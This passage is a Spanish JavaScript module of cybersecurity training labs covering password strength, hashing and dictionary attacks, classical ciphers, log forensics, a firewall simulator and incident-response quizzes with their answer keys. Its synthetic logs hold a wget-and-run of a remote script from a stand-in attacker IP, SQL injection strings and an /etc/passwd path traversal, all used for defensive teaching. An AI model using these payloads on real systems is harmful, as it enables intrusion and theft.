// Ciberseguridad: lógica sin DOM de los laboratorios (contraseñas, hashes, criptografía, registros, cortafuegos y
// respuesta a incidentes). Las interfaces están en seguridad-ui.js y las pruebas en tests/seguridad.test.mjs.

export const APROBADO = 0.8;
export const normalizar = s => String(s ?? '').normalize('NFD').replace(/[̀-ͯ]/g, '').toUpperCase().replace(/\s+/g, ' ').trim();

// ================================================================== contraseñas
export const COMUNES = ['123456', 'password', '123456789', '12345678', '12345', 'qwerty', 'abc123', '111111', '1234567', 'password1', 'iloveyou', 'admin',
  'welcome', 'monkey', 'dragon', 'football', 'letmein', 'sunshine', 'princess', 'qwerty123', 'contraseña', 'contrasena', 'hola123', 'teamo', '123123',
  '000000', '654321', 'superman', 'batman', 'master', 'admin123', 'root', 'toor', 'pass', 'test', 'guest', 'changeme', 'passw0rd', 'p@ssw0rd', 'secret',
  'baseball', 'shadow', 'michael', 'charlie', 'jordan', 'hunter', 'trustno1', 'starwars', 'pokemon', 'america', 'mexico', 'barcelona', 'realmadrid',
  'tequiero', 'amor', 'familia', 'verano', 'verano2024', 'empresa123', 'bienvenido', 'usuario', 'cambiame', 'q1w2e3r4', '1q2w3e4r', 'asdfgh', 'zxcvbn'];
const PALABRAS = ['hola', 'amor', 'casa', 'perro', 'gato', 'futbol', 'madrid', 'barcelona', 'mexico', 'password', 'admin', 'usuario', 'empresa', 'verano',
  'invierno', 'dragon', 'familia', 'dios', 'maria', 'jesus', 'clave', 'secreto', 'love', 'pass', 'welcome', 'qwerty', 'login', 'sol', 'luna', 'princesa'];
const SECUENCIAS = ['abcdefghijklmnopqrstuvwxyz', '0123456789', 'qwertyuiop', 'asdfghjkl', 'zxcvbnm'];
const VELOCIDAD = 1e10; // intentos por segundo de un ataque sin conexión con tarjetas gráficas contra un hash rápido

export function tiempoTexto(seg) {
  if (seg < 1) return 'al instante';
  const u = [[60, 'segundo', 'segundos'], [60, 'minuto', 'minutos'], [24, 'hora', 'horas'], [365, 'día', 'días'], [100, 'año', 'años'], [1e4, 'siglo', 'siglos']];
  let v = seg;
  for (const [k, uno, varios] of u) { if (v < k) { const n = Math.max(1, Math.round(v)); return `${n.toLocaleString('es')} ${n === 1 ? uno : varios}`; } v /= k; }
  return 'más de un millón de años';
}
export function analizarContrasena(pw) {
  pw = String(pw ?? '');
  const L = [...pw].length, min = pw.toLowerCase();
  const tiene = { minusculas: /[a-zñ]/.test(pw), mayusculas: /[A-ZÑ]/.test(pw), digitos: /\d/.test(pw), simbolos: /[^\p{L}\d]/u.test(pw) };
  const N = (tiene.minusculas ? 26 : 0) + (tiene.mayusculas ? 26 : 0) + (tiene.digitos ? 10 : 0) + (tiene.simbolos ? 33 : 0) + (/[^\x00-\x7f]/.test(pw.replace(/[ñÑ]/g, '')) ? 50 : 0);
  let bits = L && N ? L * Math.log2(N) : 0;
  const problemas = [];
  const base = min.replace(/^[^a-z0-9ñ]+|[^a-z0-9ñ]+$/g, '').replace(/\d{1,4}$/, '');
  if (COMUNES.includes(min) || (base && COMUNES.includes(base))) { problemas.push('Está en las listas de contraseñas más usadas: un atacante la prueba de las primeras.'); bits = Math.min(bits, 10); }
  if (L < 8) problemas.push('Es demasiado corta: menos de 8 caracteres.');
  else if (L < 12) problemas.push('Mejor con 12 caracteres o más: la longitud es lo que más cuenta.');
  if (/(.)\1\1/.test(pw)) { problemas.push('Repite el mismo carácter varias veces seguidas.'); bits -= 6; }
  const sec = SECUENCIAS.some(s => { for (let i = 0; i + 4 <= s.length; i++) { const t = s.slice(i, i + 4); if (min.includes(t) || min.includes([...t].reverse().join(''))) return true; } return false; });
  if (sec) { problemas.push('Contiene una secuencia predecible (1234, abcd, qwerty…).'); bits -= 10; }
  if (/(19|20)\d\d/.test(pw)) { problemas.push('Contiene un año: es de lo primero que se prueba.'); bits -= 6; }
  const sustituida = min.replace(/0/g, 'o').replace(/[1!]/g, 'i').replace(/3/g, 'e').replace(/[4@]/g, 'a').replace(/5|\$/g, 's').replace(/7/g, 't');
  const palabra = PALABRAS.find(w => w.length >= 4 && sustituida.includes(w));
  if (palabra) { problemas.push(`Contiene una palabra muy común («${palabra}»), aunque cambies letras por números.`); bits -= 12; }
  if (L && !tiene.simbolos && !tiene.digitos && !tiene.mayusculas && L < 16) problemas.push('Solo usa minúsculas: añade longitud o mezcla tipos de caracteres.');
  bits = Math.max(0, Math.round(bits));
  const puntuacion = bits < 28 ? 0 : bits < 45 ? 1 : bits < 60 ? 2 : bits < 80 ? 3 : 4;
  const segundos = 2 ** bits / 2 / VELOCIDAD;
  return { longitud: L, tiene, bits, puntuacion, nivel: ['Muy débil', 'Débil', 'Aceptable', 'Fuerte', 'Muy fuerte'][puntuacion], tiempo: tiempoTexto(segundos), segundos, problemas };
}
// ¿Cuál es más segura? [a, b, índice de la buena, explicación]
export const PARES = [
  ['Verano2024!', 'tren-nube-limon-faro-azul', 1, 'Una frase de varias palabras al azar es larga y no sigue ningún patrón; «Verano2024!» es palabra común + año + símbolo, el patrón que más se prueba.'],
  ['P@ssw0rd', 'k7#Qm2!xVr9$Lp', 1, 'Cambiar letras por números (@ por a, 0 por o) no engaña a nadie: los programas de ataque ya prueban esas sustituciones.'],
  ['Gx7!qL', 'mi-gato-come-pasta-los-lunes', 1, 'La longitud gana: 6 caracteres raros se prueban en segundos; una frase larga resiste siglos.'],
  ['qwerty123456', 'Rz8&uT4@wK', 1, '«qwerty» es una fila del teclado y 123456 una secuencia: está en todas las listas.'],
  ['casa-azul-feliz', 'casa', 0, 'Una palabra sola está en cualquier diccionario; tres palabras ya multiplican las combinaciones.'],
];

// ================================================================== hashes (SHA-256 con Web Crypto)
export async function sha256(texto) {
  const datos = new TextEncoder().encode(texto);
  const h = await globalThis.crypto.subtle.digest('SHA-256', datos);
  return [...new Uint8Array(h)].map(b => b.toString(16).padStart(2, '0')).join('');
}
// Base de datos filtrada de una tienda ficticia. Sin sal, dos contraseñas iguales dan el mismo hash.
export const FILTRADA = [
  { usuario: 'ana', clave: 'sunshine', sal: '9f2c' },
  { usuario: 'luis', clave: 'Tr3n!Nube-Faro-92x', sal: '41ab' },
  { usuario: 'marta', clave: '123456', sal: 'c07e' },
  { usuario: 'pedro', clave: 'qwerty123', sal: '5d19' },
  { usuario: 'sofia', clave: '123456', sal: 'e8a3' },
  { usuario: 'jorge', clave: 'limon-cielo-barco-tinta', sal: '2b6f' },
];
export async function tablaFiltrada(conSal) {
  return Promise.all(FILTRADA.map(async u => ({ usuario: u.usuario, sal: conSal ? u.sal : '', hash: await sha256(conSal ? u.sal + u.clave : u.clave) })));
}
// Ataque de diccionario: calcula el hash de cada contraseña común (con la sal de cada usuario si la hay) y compara.
export async function ataqueDiccionario(tabla) {
  const sinSal = new Map();
  if (tabla.every(u => !u.sal)) for (const p of COMUNES) sinSal.set(await sha256(p), p);
  const out = [];
  let calculos = tabla.every(u => !u.sal) ? COMUNES.length : 0;
  for (const u of tabla) {
    let encontrada = null;
    if (!u.sal) encontrada = sinSal.get(u.hash) || null;
    else for (const p of COMUNES) { calculos++; if (await sha256(u.sal + p) === u.hash) { encontrada = p; break; } }
    out.push({ usuario: u.usuario, clave: encontrada });
  }
  return { resultados: out, calculos };
}
export const PREGUNTAS_HASH = [
  { q: 'Sin sal: ¿qué dos usuarios tienen la misma contraseña? (fíjate solo en los hashes)', opciones: ['ana y pedro', 'marta y sofia', 'luis y jorge', 'Ninguno'], c: 1, e: 'Mismo texto + mismo algoritmo = mismo hash. Por eso un atacante ve a la vez a todos los que comparten contraseña.' },
  { q: 'Lanza el ataque de diccionario sin sal: ¿cuántas cuentas descubre?', opciones: ['2', '3', '4', '6'], c: 2, e: 'Cae todo lo que está en la lista de contraseñas comunes: sunshine, 123456 (dos cuentas) y qwerty123.' },
  { q: 'Activa la sal: ¿siguen teniendo marta y sofia el mismo hash?', opciones: ['Sí', 'No'], c: 1, e: 'La sal es un valor aleatorio distinto por usuario que se añade antes de calcular el hash: misma contraseña, hash distinto.' },
  { q: 'Con sal, ¿protege eso a marta de un ataque de diccionario?', opciones: ['Sí, ya es imposible', 'No: su contraseña sigue siendo 123456 y el atacante la prueba con su sal', 'Solo si cambia de usuario'], c: 1, e: 'La sal impide las tablas precalculadas y obliga a atacar cuenta por cuenta, pero una contraseña débil sigue cayendo. Por eso se usan además algoritmos lentos (bcrypt, Argon2).' },
  { q: '¿Por qué resistieron las contraseñas de luis y jorge?', opciones: ['Porque el hash de esas cuentas es más largo', 'Porque son largas, variadas y no están en ningún diccionario', 'Porque tienen mayúsculas'], c: 1, e: 'Todos los hashes SHA-256 miden lo mismo (64 caracteres hex). Lo que protege es que la contraseña no esté en las listas y sea larga.' },
];

// ================================================================== criptografía
const ABC = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
const limpiar = s => normalizar(s).replace(/[^A-Z ]/g, '');
export function cesar(texto, k) {
  k = ((k % 26) + 26) % 26;
  return [...normalizar(texto)].map(ch => { const i = ABC.indexOf(ch); return i < 0 ? ch : ABC[(i + k) % 26]; }).join('');
}
export function vigenere(texto, clave, descifrar = false) {
  const ks = [...limpiar(clave).replace(/ /g, '')].map(c => ABC.indexOf(c));
  if (!ks.length) return normalizar(texto);
  let j = 0;
  return [...normalizar(texto)].map(ch => { const i = ABC.indexOf(ch); if (i < 0) return ch; const k = ks[j++ % ks.length]; return ABC[(i + (descifrar ? 26 - k : k)) % 26]; }).join('');
}
export const b64cod = s => { const bytes = new TextEncoder().encode(s); let bin = ''; bytes.forEach(b => { bin += String.fromCharCode(b); }); return btoa(bin); };
export function b64dec(s) {
  try { const bin = atob(String(s).trim()); return new TextDecoder('utf-8', { fatal: true }).decode(Uint8Array.from(bin, c => c.charCodeAt(0))); }
  catch { return null; }
}
const SECRETO_CESAR = 'EL SERVIDOR DE COPIAS SE APAGA A LAS DOS';
const SECRETO_VIG = 'REUNION EN LA SALA TRES';
export const RETOS_CRIPTO = [
  { tipo: 'texto', titulo: 'César por fuerza bruta', q: `Este mensaje se cifró con César (desplazamiento desconocido): «${cesar(SECRETO_CESAR, 7)}». Usa la herramienta César, prueba desplazamientos y escribe el mensaje en claro.`, respuesta: SECRETO_CESAR, e: 'Con solo 25 claves posibles, César se rompe probándolas todas: es un cifrado histórico, no seguro.' },
  { tipo: 'texto', titulo: 'Vigenère con clave', q: `Un compañero te pasa «${vigenere(SECRETO_VIG, 'RED')}» cifrado con Vigenère y la clave RED. Descífralo.`, respuesta: SECRETO_VIG, e: 'Vigenère usa un desplazamiento distinto en cada letra según la clave; resiste más que César, pero hoy se rompe con análisis estadístico.' },
  { tipo: 'texto', titulo: 'Base64 no es cifrado', q: `En un script del servidor aparece «${b64cod('usuario: backup clave: Copias#2025')}». Decodifícalo con la herramienta Base64: ¿qué clave lleva dentro?`, respuesta: 'COPIAS#2025', comparar: s => s.trim().toUpperCase(), e: 'Base64 es una codificación para transportar datos, no un cifrado: no tiene clave y cualquiera lo revierte. Nunca guardes contraseñas así.' },
  { tipo: 'opciones', titulo: 'Cifrar para alguien', q: 'Ana quiere mandar a Bruno un archivo que solo Bruno pueda abrir. Con criptografía asimétrica, ¿con qué clave lo cifra?', opciones: ['Con la clave pública de Bruno', 'Con la clave privada de Ana', 'Con la clave privada de Bruno', 'Con la clave pública de Ana'], c: 0, e: 'Se cifra con la pública del destinatario: solo su clave privada, que nunca comparte, puede descifrar.' },
  { tipo: 'opciones', titulo: 'Firmar un documento', q: 'Ana quiere firmar un contrato para que cualquiera compruebe que es suyo y no se ha modificado. ¿Con qué clave firma?', opciones: ['Con su clave privada', 'Con su clave pública', 'Con la clave pública del receptor', 'Con una contraseña compartida'], c: 0, e: 'La firma se hace con la privada de quien firma y se verifica con su pública: es lo contrario que al cifrar.' },
  { tipo: 'opciones', titulo: 'Reconocer un hash', q: 'Encuentras «5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8». Tiene 64 caracteres hexadecimales. ¿Qué es más probable?', opciones: ['Un hash SHA-256', 'Un hash MD5', 'Texto cifrado con César', 'Una clave pública RSA'], c: 0, e: 'SHA-256 produce 256 bits = 64 caracteres hex (MD5: 32, SHA-1: 40). Por cierto, es el hash de «password»: está en todas las tablas.' },
  { tipo: 'opciones', titulo: 'Simétrica o asimétrica', q: 'HTTPS usa criptografía asimétrica al principio de la conexión y simétrica (AES) para el resto. ¿Por qué?', opciones: ['La asimétrica sirve para acordar una clave con un desconocido; la simétrica es mucho más rápida para los datos', 'La simétrica es más segura que la asimétrica', 'Por compatibilidad con navegadores antiguos', 'La asimétrica no puede cifrar texto'], c: 0, e: 'Cada una hace lo que mejor sabe: la asimétrica resuelve el intercambio de claves y la simétrica cifra el tráfico rápido.' },
];
export function comprobarCripto(reto, respuesta) {
  if (reto.tipo === 'opciones') return +respuesta === reto.c;
  const f = reto.comparar || (s => limpiar(s).replace(/ +/g, ' ').trim());
  return f(String(respuesta)) === f(reto.respuesta);
}

// ================================================================== registros (logs)
const rng = semilla => () => ((semilla = (semilla * 16807) % 2147483647) / 2147483647);
const hora = s => [Math.floor(s / 3600), Math.floor(s / 60) % 60, s % 60].map(n => String(n).padStart(2, '0')).join(':');
function logSsh() {
  const r = rng(42), lineas = [];
  let t = 2 * 3600 + 10 * 60;
  const pid = () => 1000 + Math.floor(r() * 8000);
  const L = (s, txt) => lineas.push({ t: s, txt: `Mar 14 ${hora(s)} srv-web01 sshd[${pid()}]: ${txt}` });
  L(t, 'Accepted publickey for deploy from 192.168.1.20 port 51522 ssh2'); t += 340;
  L(t, 'Failed password for marta from 192.168.1.35 port 50122 ssh2'); t += 6;
  L(t, 'Accepted password for marta from 192.168.1.35 port 50124 ssh2'); t += 900;
  const usuarios = ['root', 'admin', 'test', 'oracle', 'ubuntu', 'root', 'admin', 'pi', 'user', 'root', 'admin', 'guest', 'root', 'admin', 'postgres', 'root', 'admin', 'ftp', 'root', 'admin', 'support', 'root', 'admin'];
  let fallos = 0;
  for (const u of usuarios) {
    L(t, u === 'root' || u === 'admin' ? `Failed password for ${u} from 203.0.113.45 port ${40000 + Math.floor(r() * 9000)} ssh2` : `Failed password for invalid user ${u} from 203.0.113.45 port ${40000 + Math.floor(r() * 9000)} ssh2`);
    fallos++; t += 2 + Math.floor(r() * 3);
    if (fallos === 9) { L(t, 'Failed password for luis from 198.51.100.7 port 61002 ssh2'); t += 1; }
  }
  const entrada = t;
  L(t, 'Accepted password for admin from 203.0.113.45 port 48210 ssh2'); t += 1;
  L(t, 'pam_unix(sshd:session): session opened for user admin by (uid=0)'); t += 95;
  lineas.push({ t, txt: `Mar 14 ${hora(t)} srv-web01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.45/x.sh` }); t += 30;
  lineas.push({ t, txt: `Mar 14 ${hora(t)} srv-web01 sudo:    admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash x.sh` }); t += 400;
  L(t, 'Failed password for luis from 198.51.100.7 port 61040 ssh2'); t += 3;
  L(t, 'Accepted password for luis from 198.51.100.7 port 61044 ssh2');
  return { lineas: lineas.map(x => x.txt), fallosAtacante: fallos, entrada: hora(entrada) };
}
function logWeb() {
  const r = rng(7), out = [];
  let t = 9 * 3600;
  const linea = (ip, met, ruta, cod, tam, ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)') => { out.push(`${ip} - - [14/Mar/2025:${hora(t)} +0100] "${met} ${ruta} HTTP/1.1" ${cod} ${tam} "-" "${ua}"`); t += 1 + Math.floor(r() * 20); };
  linea('192.168.1.50', 'GET', '/', 200, 5120); linea('192.168.1.50', 'GET', '/productos?id=3', 200, 2210); linea('192.168.1.61', 'GET', '/contacto', 200, 1800);
  const esc = ['/admin', '/wp-login.php', '/.env', '/phpmyadmin/', '/backup.zip', '/.git/config', '/config.php.bak', '/server-status'];
  for (const ruta of esc) linea('192.0.2.77', 'GET', ruta, 404, 196, 'sqlmap/1.7 (https://sqlmap.org)');
  linea('192.168.1.50', 'GET', '/carrito', 200, 3300);
  linea('192.0.2.77', 'GET', "/productos?id=1'%20OR%20'1'='1", 500, 812, 'sqlmap/1.7 (https://sqlmap.org)');
  linea('192.0.2.77', 'GET', '/productos?id=1%20UNION%20SELECT%20usuario,clave%20FROM%20usuarios', 500, 790, 'sqlmap/1.7 (https://sqlmap.org)');
  linea('192.168.1.61', 'POST', '/login', 302, 0);
  linea('192.0.2.77', 'GET', '/descargar?f=../../../../etc/passwd', 200, 1874, 'curl/8.4.0');
  linea('192.168.1.50', 'GET', '/productos?id=7', 200, 2240);
  return out;
}
const SSH = logSsh();
export const LOGS = {
  ssh: {
    titulo: 'Fuerza bruta contra SSH', archivo: '/var/log/auth.log', lineas: SSH.lineas,
    intro: 'Esta mañana el servidor web srv-web01 se comporta raro. Tienes su registro de autenticación (auth.log). Usa el filtro como un grep para encontrar qué pasó.',
    preguntas: [
      { q: '¿Qué IP está probando contraseñas una y otra vez?', respuesta: '203.0.113.45', e: 'Decenas de «Failed password» seguidos desde la misma IP en pocos segundos: fuerza bruta automatizada.' },
      { q: '¿Cuántos intentos fallidos hace esa IP? (filtra por «Failed» y por la IP)', respuesta: String(SSH.fallosAtacante), e: 'Filtrando «Failed password» y la IP sale el número exacto. Contarlos ayuda a fijar umbrales de alerta (por ejemplo, 5 fallos en 1 minuto).' },
      { q: '¿Con qué usuario consigue entrar el atacante?', respuesta: 'admin', e: 'Tras los fallos aparece «Accepted password for admin from 203.0.113.45»: la contraseña de admin era débil.' },
      { q: '¿A qué hora entra? (hh:mm:ss)', respuesta: SSH.entrada, e: 'La hora exacta del acceso marca el inicio de la línea de tiempo del incidente.' },
      { q: '¿Qué hace justo después de entrar?', opciones: ['Descarga y ejecuta un script como root', 'Cierra la sesión sin hacer nada', 'Cambia su propia contraseña', 'Actualiza el sistema'], c: 0, e: 'Con sudo descarga x.sh de su propia IP y lo ejecuta como root: el servidor está comprometido.' },
      { q: '¿Qué es lo primero que harías?', opciones: ['Aislar el servidor, bloquear la IP, desactivar la cuenta admin y avisar según el plan de incidentes', 'Borrar auth.log para limpiar', 'Esperar a ver si vuelve a pasar', 'Reiniciar el servidor y seguir trabajando'], c: 0, e: 'Contener primero, sin destruir evidencias. Después: investigar qué cambió x.sh, reinstalar desde una imagen limpia, SSH solo con claves y MFA, y fail2ban.' },
    ],
  },
  web: {
    titulo: 'Ataques contra la tienda web', archivo: '/var/log/nginx/access.log', lineas: logWeb(),
    intro: 'El registro de accesos del servidor web de la tienda. Mezcla clientes normales con alguien que está atacando. Encuéntralo y entiende qué intentó.',
    preguntas: [
      { q: '¿Qué IP es la del atacante?', respuesta: '192.0.2.77', e: 'Pide rutas que no existen en esta web (/wp-login.php, /.env, /.git/config) y usa herramientas automáticas (sqlmap, curl).' },
      { q: '¿Cuántas respuestas 404 provoca su escaneo de rutas?', respuesta: '8', e: 'Un escaneo busca archivos y paneles olvidados: muchos 404 seguidos desde una IP son una señal clara.' },
      { q: "¿Qué tipo de ataque son las peticiones con ' OR '1'='1 y UNION SELECT?", opciones: ['Inyección SQL', 'Cross-site scripting (XSS)', 'Denegación de servicio', 'Fuerza bruta'], c: 0, e: 'Intenta alterar la consulta SQL de /productos. Los 500 indican que la consulta se rompe: hay que usar consultas parametrizadas.' },
      { q: '¿Qué herramienta dice usar el atacante en su User-Agent?', respuesta: 'sqlmap', comparar: s => s.trim().toLowerCase().replace(/\/.*$/, ''), e: 'sqlmap automatiza la inyección SQL. El User-Agent se puede falsificar, pero muchas herramientas lo dejan tal cual.' },
      { q: '¿Qué petición peligrosa tuvo éxito (código 200)?', opciones: ['/descargar?f=../../../../etc/passwd (recorrido de directorios)', '/.env', "/productos?id=1' OR '1'='1", '/admin'], c: 0, e: 'Con ../ salió de la carpeta de descargas y leyó /etc/passwd. Hay que validar el nombre de archivo y no construir rutas con datos del usuario.' },
    ],
  },
};
export function comprobarLog(p, respuesta) {
  if (p.opciones) return +respuesta === p.c;
  const f = p.comparar || (s => String(s).trim().toLowerCase());
  return f(respuesta) === f(p.respuesta);
}
export const filtrarLineas = (lineas, filtro) => {
  const ts = String(filtro || '').toLowerCase().split(/\s+/).filter(Boolean);
  return ts.length ? lineas.filter(l => ts.every(t => l.toLowerCase().includes(t))) : lineas;
};

// ================================================================== cortafuegos
const ipN = ip => ip.split('.').reduce((a, o) => a * 256 + +o, 0);
const enCidr = (ip, cidr) => { const [red, p] = cidr.split('/'); const b = 2 ** (32 - +p); return Math.floor(ipN(ip) / b) === Math.floor(ipN(red) / b); };
export const ZONAS = { LAN: '192.168.1.0/24', DMZ: '172.16.0.0/24' };
export const PUERTOS_CONOCIDOS = [['web (80)', 80], ['web segura (443)', 443], ['DNS (53)', 53], ['SSH (22)', 22], ['RDP (3389)', 3389], ['SMB (445)', 445], ['correo SMTP (25)', 25]];
export const zonaDe = ip => (enCidr(ip, ZONAS.LAN) ? 'LAN' : enCidr(ip, ZONAS.DMZ) ? 'DMZ' : 'Internet');
// origen/destino de una regla: 'cualquiera', una zona ('LAN', 'DMZ', 'Internet') o una IP concreta.
const coincideDir = (regla, ip) => regla === 'cualquiera' || regla === zonaDe(ip) || regla === ip;
export function evaluarFirewall(reglas, flujo) {
  for (let i = 0; i < reglas.length; i++) {
    const r = reglas[i];
    if ((r.proto === 'cualquiera' || r.proto === flujo.proto) && coincideDir(r.origen, flujo.origen) && coincideDir(r.destino, flujo.destino)
      && (r.puerto === 'cualquiera' || flujo.proto === 'icmp' || +r.puerto === flujo.puerto)) return { accion: r.accion, regla: i };
  }
  return { accion: 'denegar', regla: -1 };
}
export const RETOS_FW = {
  oficina: {
    titulo: 'El cortafuegos de la oficina', nivel: 'intermedio',
    intro: 'Un cortafuegos separa la LAN de la oficina (192.168.1.0/24) de Internet. Al final hay una regla implícita que lo deniega todo. Añade solo lo necesario: es el principio de mínimo privilegio. (Es un cortafuegos con estado: las respuestas de una conexión permitida vuelven solas.)',
    hosts: { 'Servidor DNS 8.8.8.8': '8.8.8.8' }, inicial: [],
    flujos: [
      { d: 'Un empleado navega por una web HTTPS', origen: '192.168.1.25', destino: '93.184.216.34', proto: 'tcp', puerto: 443, debe: 'permitir' },
      { d: 'Un empleado abre una web antigua sin HTTPS', origen: '192.168.1.40', destino: '93.184.216.34', proto: 'tcp', puerto: 80, debe: 'permitir' },
      { d: 'Los PC resuelven nombres con el DNS 8.8.8.8', origen: '192.168.1.25', destino: '8.8.8.8', proto: 'udp', puerto: 53, debe: 'permitir' },
      { d: 'Alguien en Internet intenta entrar por escritorio remoto (RDP) a un PC', origen: '203.0.113.9', destino: '192.168.1.25', proto: 'tcp', puerto: 3389, debe: 'denegar' },
      { d: 'Un PC infectado intenta compartir archivos (SMB) con Internet', origen: '192.168.1.66', destino: '198.51.100.20', proto: 'tcp', puerto: 445, debe: 'denegar' },
      { d: 'Un escaneo desde Internet busca SSH abierto en la oficina', origen: '198.51.100.20', destino: '192.168.1.1', proto: 'tcp', puerto: 22, debe: 'denegar' },
    ],
  },
  dmz: {
    titulo: 'Publicar un servidor en la DMZ', nivel: 'intermedio',
    intro: 'La tienda online (172.16.0.10) está en la DMZ, separada de la LAN. Alguien dejó al principio una regla que lo permite todo «para probar». Ordena y corrige las reglas: el cortafuegos aplica la primera que coincide.',
    hosts: { 'Servidor web 172.16.0.10': '172.16.0.10' },
    inicial: [
      { accion: 'permitir', proto: 'cualquiera', origen: 'cualquiera', destino: 'cualquiera', puerto: 'cualquiera' },
      { accion: 'permitir', proto: 'tcp', origen: 'Internet', destino: '172.16.0.10', puerto: 443 },
      { accion: 'permitir', proto: 'tcp', origen: 'LAN', destino: 'Internet', puerto: 443 },
    ],
    flujos: [
      { d: 'Clientes de Internet compran en la tienda (HTTPS)', origen: '203.0.113.50', destino: '172.16.0.10', proto: 'tcp', puerto: 443, debe: 'permitir' },
      { d: 'El administrador entra por SSH al servidor web desde la LAN', origen: '192.168.1.10', destino: '172.16.0.10', proto: 'tcp', puerto: 22, debe: 'permitir' },
      { d: 'Los empleados navegan por HTTPS', origen: '192.168.1.30', destino: '93.184.216.34', proto: 'tcp', puerto: 443, debe: 'permitir' },
      { d: 'Alguien en Internet intenta entrar por SSH al servidor web', origen: '198.51.100.20', destino: '172.16.0.10', proto: 'tcp', puerto: 22, debe: 'denegar' },
      { d: 'El servidor web (si lo comprometen) intenta conectar con un PC de la LAN por SMB', origen: '172.16.0.10', destino: '192.168.1.30', proto: 'tcp', puerto: 445, debe: 'denegar' },
      { d: 'Desde Internet intentan llegar directamente a un PC de la LAN', origen: '203.0.113.50', destino: '192.168.1.30', proto: 'tcp', puerto: 443, debe: 'denegar' },
      { d: 'Alguien en Internet prueba la web sin cifrar (HTTP) del servidor', origen: '203.0.113.50', destino: '172.16.0.10', proto: 'tcp', puerto: 80, debe: 'denegar' },
    ],
  },
};
export const revisarFirewall = (reto, reglas) => reto.flujos.map(f => evaluarFirewall(reglas, f).accion === f.debe);

// ================================================================== respuesta a incidentes
export const INCIDENTES = {
  ransomware: {
    titulo: 'Ransomware en contabilidad', nivel: 'avanzado',
    intro: 'Lunes, 8:40. Una persona de contabilidad llama: sus archivos tienen la extensión .locked y en el escritorio hay una nota que pide 2 bitcoins. Tú atiendes el incidente. Cada decisión cuenta.',
    pasos: [
      { s: '¿Qué haces primero con el equipo afectado?', o: [['Desconectarlo de la red (cable y Wi-Fi) sin apagarlo', 2, 'Correcto: se corta la propagación y se conserva la memoria por si hace falta analizarla.'], ['Apagarlo de golpe', 1, 'Frena el cifrado, pero se pierde lo que hay en memoria (procesos, a veces claves). Aislar de la red es mejor.'], ['Dejarlo encendido y conectado para ver qué hace', 0, 'Mientras sigue en red, el ransomware puede cifrar carpetas compartidas y saltar a otros equipos.']] },
      { s: 'El equipo está aislado. ¿Y ahora?', o: [['Avisar al responsable de seguridad y seguir el plan de respuesta a incidentes', 2, 'Un incidente no se gestiona en solitario: el plan dice quién decide, a quién se informa y qué se documenta.'], ['Arreglarlo sin decir nada para no alarmar', 0, 'Ocultar un incidente retrasa la contención y puede incumplir obligaciones legales de notificación.'], ['Publicarlo en el chat general de la empresa', 1, 'Hay que comunicar, pero por los canales del plan: un aviso desordenado genera pánico y filtra información.']] },
      { s: 'Antes de tocar nada más, ¿qué haces con las pruebas?', o: [['Fotografiar la nota, anotar horas y conservar registros y el disco tal cual', 2, 'Las evidencias permiten saber cómo entró y son necesarias si se denuncia o interviene el seguro.'], ['Borrar la nota y los archivos .locked para limpiar', 0, 'Se destruyen pruebas y, a veces, archivos que aún podrían recuperarse.'], ['Reinstalar Windows ya para que pueda seguir trabajando', 0, 'Sin saber cómo entró, se borra la evidencia y el atacante puede volver por el mismo hueco.']] },
      { s: 'Toca medir el alcance. ¿Qué revisas?', o: [['Otros equipos, las carpetas compartidas y los registros para ver desde dónde y hasta dónde llegó', 2, 'El ransomware rara vez está solo en un equipo: hay que encontrar el punto de entrada y todo lo afectado.'], ['Solo ese PC: si está aislado, se acabó', 0, 'Puede haber otros equipos infectados o una cuenta comprometida que el atacante sigue usando.'], ['Nada: lo importante es recuperar rápido', 0, 'Recuperar sin conocer el alcance suele acabar en una segunda infección.']] },
      { s: 'La dirección pregunta si pagar el rescate. ¿Qué recomiendas?', o: [['No pagar: restaurar desde una copia de seguridad verificada y desconectada, después de eliminar la causa', 2, 'Pagar no garantiza recuperar nada, financia al atacante y te marca como objetivo. La copia 3-2-1 offline es la defensa.'], ['Pagar, que es lo más rápido', 0, 'Muchas víctimas pagan y no recuperan los datos, o los recuperan a medias y vuelven a ser atacadas.'], ['Restaurar la copia ahora mismo, sin más', 1, 'Si no se elimina antes la causa (cuenta robada, equipo infectado), la copia restaurada se vuelve a cifrar.']] },
      { s: 'Todo vuelve a funcionar. ¿Se cierra el incidente?', o: [['Primero un informe de lecciones aprendidas: causa, línea de tiempo y mejoras (parches, MFA, formación, copias)', 2, 'La última fase del ciclo NIST es aprender: si no se corrige la causa, se repetirá.'], ['Sí, ya está todo bien', 0, 'Sin análisis posterior, la misma puerta sigue abierta.'], ['Solo cambiar la contraseña del usuario afectado', 1, 'Ayuda, pero no explica cómo entró ni evita la próxima vez.']] },
    ],
  },
  cuenta: {
    titulo: 'Una cuenta de correo comprometida', nivel: 'avanzado',
    intro: 'Varios clientes avisan de que el correo de Laura (Ventas) les pide cambiar el número de cuenta para los pagos. Laura no ha enviado esos correos. En el registro de inicios de sesión hay un acceso desde otro país a las 3:12.',
    pasos: [
      { s: '¿Qué haces primero?', o: [['Bloquear el inicio de sesión, cerrar todas sus sesiones activas y restablecer la contraseña', 2, 'Hay que echar al atacante ya: cambiar la contraseña sin cerrar sesiones deja dentro a quien ya ha entrado.'], ['Enviar un correo a Laura preguntando', 0, 'Si el atacante controla el buzón, puede leer y borrar ese correo.'], ['Esperar a que Laura vuelva de su reunión', 0, 'Cada minuto el atacante puede enviar más fraudes a los clientes.']] },
      { s: 'La cuenta está asegurada. ¿Qué revisas en el buzón?', o: [['Reglas de reenvío y de bandeja creadas por el atacante, y la carpeta de enviados', 2, 'Es típico crear una regla que reenvía o esconde las respuestas de los clientes para que la víctima no se entere.'], ['Solo la bandeja de entrada', 1, 'Faltan las reglas ocultas y los correos enviados, que muestran el alcance real del fraude.'], ['Nada, ya cambiamos la contraseña', 0, 'Las reglas de reenvío siguen funcionando aunque cambie la contraseña.']] },
